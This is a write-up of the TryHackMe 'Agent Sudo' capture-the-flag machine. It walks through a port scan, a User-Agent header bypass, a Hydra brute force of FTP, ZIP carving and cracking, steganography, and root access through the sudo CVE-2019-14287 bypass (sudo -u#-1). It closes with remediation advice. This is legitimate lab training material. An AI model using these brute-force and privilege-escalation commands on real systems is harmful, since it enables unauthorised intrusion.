# TryHackMe: Agent Sudo | Web Flaws, Forensics & CVE-2019-14287

**Author:** 0xZiki
**Platform:** TryHackMe | **Target:** Agent Sudo  
**Focus:** OS Internals, TCP States, Forensics, and C-Level Syscall Exploitation  

## 📑 Overview
In the realm of Red Teaming, running automated tools without understanding their underlying mechanisms is a dangerous habit. True operational maturity comes from understanding TCP states at the OS level, dissecting file formats, troubleshooting environment execution paths, and manipulating system calls.

This repository contains a comprehensive technical log of exploiting the "Agent Sudo" machine. It goes beyond a standard CTF walkthrough, detailing the exact OS mechanics, operational mistakes, environmental troubleshooting (WSL/Zsh conflicts), and the C-level logic behind Privilege Escalation (CVE-2019-14287).

## 🎯 Executive Summary
During this engagement, the host was fully compromised, yielding Root access through the following chained attack vectors:
1. **Broken Access Control:** Abusing a logical flaw where the backend relied on the `User-Agent` HTTP header for routing and authentication.
2. **Credential Stuffing:** Exploiting weak FTP credentials discovered via dynamic wordlist parsing.
3. **Advanced Forensics:** Performing manual binary carving (via `dd`), bypassing legacy compression limitations, and extracting LSB (Least Significant Bit) steganography data.
4. **Privilege Escalation:** Bypassing explicit SysAdmin `sudo` restrictions by manipulating POSIX standard system calls using negative unsigned integer IDs (`-u#-1`).

---
## 1. Network Reconnaissance & TCP State Analysis

The engagement commenced with a comprehensive attack surface mapping. Operational Security (OPSEC) was prioritized by utilizing a TCP SYN scan (`-sS`) combined with OS and version detection.

```bash
$ sudo nmap -sS -sV -p- -T4 -O 10.112.147.92
Starting Nmap 7.94SVN ( https://nmap.org )
Nmap scan report for 10.112.147.92
Host is up (0.066s latency).
Not shown: 65532 closed tcp ports (reset)
PORT   STATE SERVICE VERSION
21/tcp open  ftp     vsftpd 3.0.3
22/tcp open  ssh     OpenSSH 7.6p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0)
80/tcp open  http    Apache httpd 2.4.29 ((Ubuntu))
[...]
```

**Technical Analysis:**
By examining the output `65532 closed tcp ports (reset)`, we confirm the OS-level TCP/IP stack behavior. Because we initiated a half-open `SYN` scan, the target OS responded with `RST` (Reset) packets for closed ports and `SYN-ACK` for open ones. Nmap immediately tears down the connection upon receiving the `SYN-ACK`, preventing a full `connect()` system call and minimizing application-layer logging for FTP, SSH, and HTTP.

## 2. Web Application Logic & Authentication Bypass

Enumeration of the HTTP service (Port 80) revealed a severe architectural flaw: **Broken Access Control via Client-Side Headers**. The backend application lacked proper session management (e.g., JWT or Session Cookies), relying instead on the `User-Agent` string for routing logic.

By fuzzing the `User-Agent` header, we submitted the agent codename "C", which triggered an internal redirect exposing a valid username.

```bash
$ curl -v -A "C" -L http://10.112.147.92
* Connected to 10.112.147.92 (10.112.147.92) port 80
> GET / HTTP/1.1
> Host: 10.112.147.92
> User-Agent: C
> Accept: */*
>
< HTTP/1.1 302 Found
< Location: agent_C_attention.php

* Issue another request to this URL: 'http://10.112.147.92/agent_C_attention.php'
> GET /agent_C_attention.php HTTP/1.1
> Host: 10.112.147.92
> User-Agent: C
>
< HTTP/1.1 200 OK
< Content-Length: 177
< Content-Type: text/html; charset=UTF-8
<
Attention chris, <br><br>

Do you still remember our deal? Please tell agent J about the stuff ASAP. Also, change your god damn password, is weak! <br><br>
```

**The Mechanics:** 
The `-v` (verbose) flag exposes the raw HTTP headers. The backend PHP logic processes `$_SERVER['HTTP_USER_AGENT']` and explicitly issues an `HTTP 302 Found` redirect to `agent_C_attention.php`. Following the redirect (`-L`), we uncovered the internal username (`chris`) and a critical intelligence leak: the password was weak.

## 3. Protocol Brute-Forcing & Forensic Data Acquisition

Leveraging the intelligence gathered, we targeted the FTP service (Port 21). We utilized `Hydra` to perform a credential stuffing attack. 

*Note on Tooling Syntax:* The uppercase `-P` flag is critical here as it instructs the tool to parse a dynamic wordlist (`rockyou.txt`), whereas a lowercase `-p` would merely test the literal string.

```bash
$ hydra -l chris -P /usr/share/wordlists/rockyou.txt ftp://10.112.147.92
Hydra v9.5 (c) 2023 by van Hauser/THC & David Maciejak

[DATA] max 16 tasks per 1 server, overall 16 tasks, 14344398 login tries
[21][ftp] host: 10.112.147.92   login: chris   password: crystal
1 of 1 target successfully completed, 1 valid password found
```

With the password (`crystal`) cracked, we established an authenticated FTP session. Maintaining operational integrity, we verified the sizes of the forensic artifacts before pulling them to our local environment.

```bash
$ ftp 10.112.147.92
Connected to 10.112.147.92.
220 (vsFTPd 3.0.3)
Name (10.112.147.92:hacker): chris
331 Please specify the password.
Password:
230 Login successful.
ftp> ls
-rw-r--r--    1 0        0             217 Oct 29  2019 To_agentJ.txt
-rw-r--r--    1 0        0           33143 Oct 29  2019 cute-alien.jpg
-rw-r--r--    1 0        0           34842 Oct 29  2019 cutie.png

ftp> get To_agentJ.txt
ftp> get cute-alien.jpg
ftp> get cutie.png
```
## 4. Advanced Digital Forensics & File Carving

With the target files acquired, we initiated the forensic analysis phase. Using `binwalk`, we analyzed the magic bytes of `cutie.png` and discovered a hidden ZIP archive appended to the image file at hexadecimal offset `0x8702` (Decimal `34562`).

To ensure precision and avoid automated extractor failures (e.g., missing Java `jar` dependencies), we utilized `dd` to perform raw, low-level binary carving based on the exact byte offset.

```bash
$ binwalk -e cutie.png

DECIMAL       HEXADECIMAL     DESCRIPTION
--------------------------------------------------------------------------------
0             0x0             PNG image, 528 x 528, 8-bit colormap, non-interlaced
869           0x365           Zlib compressed data, best compression

WARNING: Extractor.execute failed to run external extractor 'jar xvf '%e'': [Errno 2] No such file or directory: 'jar', 'jar xvf '%e'' might not be installed correctly
34562         0x8702          Zip archive data, encrypted compressed size: 98, uncompressed size: 86, name: To_agentR.txt
34820         0x8804          End of Zip archive, footer length: 22

$ dd if=cutie.png of=8702.zip bs=1 skip=34562
280+0 records in
280+0 records out
280 bytes copied, 0.000601391 s, 466 kB/s
```

**Architectural Note (The ZIP Central Directory):**
We executed `unzip -l 8702.zip` to list the contents. Notice that it did not prompt for a password to reveal the filename (`To_agentR.txt`). This is not a bug; structurally, a ZIP file maintains an unencrypted "Central Directory" at the end of the archive for metadata parsing. However, extracting the actual data payload still requires the decryption key.

```bash
$ unzip -l 8702.zip
Archive:  8702.zip
  Length      Date    Time    Name
---------  ---------- -----   ----
       86  2019-10-29 20:29   To_agentR.txt
---------                     -------
       86                     1 file
```

## 5. Cryptography, Environment Troubleshooting & Steganography

To crack the ZIP archive, we compiled a custom `John the Ripper (Jumbo)` instance. To avoid environmental path conflicts (`$PATH`) and shell issues (Zsh vs. Bash built-ins), the binaries were executed directly from the compiled `run` directory.

```bash
$ cd ~/john-jumbo/run
$ ./zip2john ~/Agent_sudo/8702.zip > zip_hash.txt
$ ./john --wordlist=/usr/share/wordlists/rockyou.txt zip_hash.txt
Loaded 1 password hash (ZIP, WinZip [PBKDF2-SHA1 256/256 AVX2 8x])
Cracked 1 password hash (is in ./john.pot), use "--show"

$ ./john --show zip_hash.txt
8702.zip/To_agentR.txt:alien:To_agentR.txt:8702.zip:/home/hacker/Agent_sudo/8702.zip
1 password hash cracked, 0 left
```

**Bypassing Legacy Extractor Limitations:**
Standard Linux `unzip` utilities often fail with modern compression algorithms (v5.1). To bypass this, we pivoted to `7z`, which successfully utilized the cracked password (`alien`) to extract the payload.

```bash
$ cd ~/Agent_sudo
$ 7z x 8702.zip
[...]
Enter password (will not be echoed):
Everything is Ok
Size:       86
Compressed: 280
```

Inside the extracted text file, we found a Base64 string (`QXJlYTUx`). Decoding this yielded the passphrase: `Area51`. 
While the ZIP file relied on *File Appending*, the second image (`cute-alien.jpg`) utilized *LSB (Least Significant Bit) Steganography*. We used `steghide` with the decoded passphrase to extract the final SSH credentials.

```bash
$ cat To_agentR.txt
Agent C,
We need to send the picture to 'QXJlYTUx' as soon as possible!
By,
Agent R

$ echo "QXJlYTUx" | base64 -d
Area51%                                                                                                                                         
$ steghide extract -sf ~/Agent_sudo/cute-alien.jpg
Enter passphrase:
wrote extracted data to "message.txt".

$ cat message.txt
Hi james,
Glad you find this message. Your login password is hackerrules!
[...]
```

## 6. Privilege Escalation: Exploiting OS-Level System Calls (CVE-2019-14287)

Utilizing the extracted credentials, we established an SSH session as the user `james`. Enumerating user privileges via `sudo -l` revealed a specific, yet fatally flawed, security configuration: `(ALL, !root) /bin/bash`.

```bash
$ ssh james@10.112.147.92
james@10.112.147.92's password:
Welcome to Ubuntu 18.04.3 LTS (GNU/Linux 4.15.0-55-generic x86_64)
[...]
james@agent-sudo:~$ sudo -l
[sudo] password for james:
User james may run the following commands on agent-sudo:
    (ALL, !root) /bin/bash
```

**The Vulnerability Mechanics (CVE-2019-14287):**
The administrator intended to allow `james` to execute bash as any user *except* root. However, by supplying a User ID of `-1` (or its unsigned 32-bit integer equivalent `4294967295`), we bypass this restriction. 

At the OS level:
1. `sudo` parses `-1`. Since `-1` does not resolve to the `root` user in the system database, it passes the `(!root)` policy check.
2. `sudo` invokes the underlying Linux Kernel system calls (e.g., `setresuid()`).
3. In POSIX standards, passing `-1` to these functions translates to: *"Do not change the current UID"*.
4. Because the `sudo` binary natively executes as a setuid-root process (UID 0), the system call leaves the process running as `root` instead of dropping privileges.

```bash
james@agent-sudo:~$ sudo -u#-1 /bin/bash
root@agent-sudo:~# ls
Alien_autospy.jpg  user_flag.txt
root@agent-sudo:~# cat user_flag.txt
b03d975e8c92a7c04146cfa7a5a313c7

root@agent-sudo:~# cd /root
root@agent-sudo:/root# cat root.txt
To Mr.hacker,
Congratulation on rooting this box. This box was designed for TryHackMe. Tips, always update your machine.

Your flag is
b53a02f55b57d4439e3341834d70c062
```

*(Intelligence Note: The `Alien_autospy.jpg` file found in the home directory is a forensic breadcrumb referencing the infamous "Roswell incident").*

---

## 🛡️ Remediation & Defensive Posture

To secure enterprise environments against similar attack vectors, the following measures must be implemented:
1. **Access Control:** Eliminate the use of arbitrary client-side headers (`User-Agent`) for authentication routing. Implement standardized Session Tokens (JWT).
2. **Password Policies:** Enforce stringent password complexity and deploy active countermeasures (e.g., `fail2ban`) against brute-force attacks on FTP/SSH endpoints.
3. **Patch Management:** Immediately upgrade the `sudo` package to version `1.8.28` or newer. Avoid using negative definitions (e.g., `!root`) in the `sudoers` file, opting instead for explicit Allow-Lists.
